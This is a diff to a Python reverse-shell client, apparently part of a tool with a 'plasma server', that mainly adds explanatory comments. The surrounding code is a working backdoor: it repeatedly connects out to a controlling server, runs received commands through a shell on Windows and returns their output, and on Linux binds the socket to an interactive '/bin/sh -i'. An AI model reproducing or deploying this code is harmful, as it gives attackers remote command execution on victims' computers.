@@ -6,6 +6,7 @@ import argparse
 import time
 from colorama import Fore,init
 
+#make sure colors work properly in Windows
 if sys.platform == 'win32' or sys.platform == 'win64':
     init(convert=True)
 
@@ -20,6 +21,7 @@ args = parser.parse_args()
 
 loop = False
 
+#set some defaults
 if args.retries and not args.retry:
     args.retry = 5
 elif args.retry and not args.retries:
@@ -37,6 +39,7 @@ ip = ''
 banner = ''
 retry_counter = 1
 
+#opening connection to plasma server
 def open_conn():
     try:
         global s
@@ -44,6 +47,7 @@ def open_conn():
         global retries
         global retry
 
+        #if retries are active, keep banging on the door!
         if retries or retry:
             while (retries > 0) or (loop == True):
 
@@ -68,6 +72,7 @@ def open_conn():
                             print(Fore.LIGHTYELLOW_EX + '[+] Waiting ' + str(retry) + ' second(s) until next attempt' + Fore.RESET)
                             time.sleep(retry)
         
+        #try once and leave
         else:
             s = socket.socket()
             print(Fore.LIGHTYELLOW_EX + '[+] Attempting to connect to ' + server + ' on port ' + str(port) + Fore.RESET)
@@ -80,7 +85,8 @@ def open_conn():
             except:
                 print(Fore.LIGHTRED_EX + '[!] Could not connect to ' + server + ' on port ' + str(port) + Fore.RESET)
                 s.close() 
-        
+
+    #something bad happened 
     except:
         s.close()
         print(Fore.LIGHTYELLOW_EX + '[!] Fatal Error. Exiting.' + Fore.RESET)
@@ -92,11 +98,14 @@ def send_commands():
     global retry
     global args
 
+    #Windows needs to use different code to get commands over
     try:
         if sys.platform == 'win32' or sys.platform == 'win64':
             while True:
                 try:
                     data = s.recv(1024)
+
+                    #have to do things a bit differently if we're changing directories
                     if data[:2].decode('utf-8') == 'cd':
                         try:
                             os.chdir(data[3:].decode('utf-8').rstrip())
@@ -104,24 +113,30 @@ def send_commands():
                         except:
                             s.send(str.encode('The system cannot find the path specified.\n\n' + os.getcwd() + '> '))
 
+                    #if hit "Enter" go to newline
                     elif data.decode('utf-8') == '\n':
                         s.send(str.encode(os.getcwd() + '> '))
+
+                    #run code
                     elif len(data) > 0:
                         cmd = subprocess.Popen(data.decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                         output = (cmd.stdout.read() + cmd.stderr.read()).decode('utf-8')
                         s.send(str.encode(output + '\n' + os.getcwd() + '> '))
                 except Exception as e:
                     break
-            #p=subprocess.call(["C:/Windows/System32/cmd.exe"])
+    
+        #if Linux send these
         else:
             os.dup2(s.fileno(),0)
             os.dup2(s.fileno(),1)
             os.dup2(s.fileno(),2)
             p=subprocess.call(["/bin/sh","-i"])
 
+    #something broke
     except:
         print(Fore.LIGHTRED_EX + '[!] Connection Error. Exiting.' + Fore.RESET)
     
+    #if retries were set, try to connect back to server automatically
     if retries or retry:
         retries = args.retries
         print(Fore.LIGHTRED_EX + '[!] Connection lost. Attempting to reconnect...' + Fore.RESET)
@@ -129,4 +144,5 @@ def send_commands():
     else:
         print(Fore.LIGHTYELLOW_EX + '[+] Session completed. Exiting.' + Fore.RESET)
 
+#start
 open_conn()
